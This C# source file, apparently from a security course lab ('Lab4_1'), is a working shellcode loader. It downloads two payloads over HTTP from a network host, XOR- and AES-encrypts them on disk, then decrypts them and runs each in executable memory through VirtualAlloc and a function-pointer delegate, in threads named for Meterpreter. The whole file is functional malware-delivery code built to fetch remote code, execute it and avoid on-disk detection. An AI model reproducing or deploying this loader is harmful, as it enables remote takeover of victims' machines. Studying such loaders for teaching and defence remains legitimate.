using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Lab4_1
{
    internal class Program
    {
        [DllImport("Kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            int dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("Kernel32.dll")]
        private static extern bool VirtualFree(
            IntPtr lpAddress,
            int dwSize,
            UInt32 dwFreeType
        );

        private static UInt32 MEM_COMMIT = 0x00001000;
        private static UInt32 MEM_RESERVE = 0x00002000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_DECOMMIT = 0x00004000;

        private delegate void RunShellcodeDelegate();

        public static async Task Main(string[] args)
        {
            // get shellcode bytes payload via HTTP
            string payload1Url = "http://192.168.254.104:8000/https_1337.bytes";
            string payload2Url = "http://192.168.254.104:8000/https_1338.bytes";
            byte[] payload1 = await DownloadShellcode(payload1Url);
            byte[] payload2 = await DownloadShellcode(payload2Url);

            // keys
            byte[] xorKey = new byte[5];
            byte[] aesKey = new byte[16];   // AES keys are 16 bytes
            byte[] aesIV = new byte[16];    // so is the init. vec.
            // fill keys with random bytes
            // byte[] is initialized with null bytes (0x0)
            Random rnd = new Random();
            rnd.NextBytes(xorKey);
            rnd.NextBytes(aesKey);
            rnd.NextBytes(aesIV);

            // filepaths to save encrypted shellcode to on disk
            string payload1Filepath = @"C:\Users\proha\OneDrive\Desktop\xorEncryptedPayloadTest.bytes";
            string payload2Filepath = @"C:\Users\proha\OneDrive\Desktop\aesEncryptedPayloadTest.bytes";

            // Xor encrypt and write to file
            File.WriteAllBytes(payload1Filepath, Xor(payload1, xorKey));

            // AES encrypt and write to file
            File.WriteAllBytes(payload2Filepath, AesEncrypt(payload2, aesKey, aesIV));

            // run each payload on its own thread to not block the rest of the program
            Thread meterpreter1 = new Thread(() => InjectShellcode(Xor(File.ReadAllBytes(payload1Filepath), xorKey)));
            Thread meterpreter2 = new Thread(() => InjectShellcode(AesDecrypt(File.ReadAllBytes(payload2Filepath), aesKey, aesIV)));
            // make sure threads are FOREGROUND, NOT BACKGROUND THREADS
            // i.e. not ThreadPool either
            // otherwise the program WILL NOT WAIT ON THEM, AND JUST EXIT / CONTINUE
            meterpreter1.IsBackground = false;
            meterpreter2.IsBackground = false;
            meterpreter1.Start();
            meterpreter2.Start();
        }
        public static byte[] Xor(byte[] data, byte[] key)
        {
            byte[] xored = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                xored[i] = Convert.ToByte(data[i] ^ key[i % key.Length]);
            }
            return xored;
        }

        // StreamWriter is for CHARACTERS/STRINGS, NOT BYTES IN GENERAL
        public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                ICryptoTransform encryptor = aes.CreateEncryptor(key, iv);
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        // write with cryptoStream DIRECTLY when dealing with BYTES (ASCII)
                        // instead of using StreamWriter, which is for STRINGS (UTF, etc.)
                        cryptoStream.Write(data);
                    }
                    // memoryStream.ToArray(); returns BYTES
                    return memoryStream.ToArray();
                }
            }
        }

        public static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(data);
                    }
                    return memoryStream.ToArray();
                }
            }
        }

        public static async Task<byte[]> DownloadShellcode(string url)
        {
            Uri uri = new Uri(url);
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage responseMessage = await client.GetAsync(uri);
                byte[] payload = await responseMessage.Content.ReadAsByteArrayAsync();
                return payload;
            }
        }

        public static void InjectShellcode(byte[] payload)
        {
            IntPtr ptrStart = VirtualAlloc(IntPtr.Zero, payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(payload, 0, ptrStart, payload.Length);
            RunShellcodeDelegate shellcodeDelegate = (RunShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(ptrStart, typeof(RunShellcodeDelegate));
            shellcodeDelegate();
            VirtualFree(ptrStart, payload.Length, MEM_DECOMMIT);
        }
    }
}
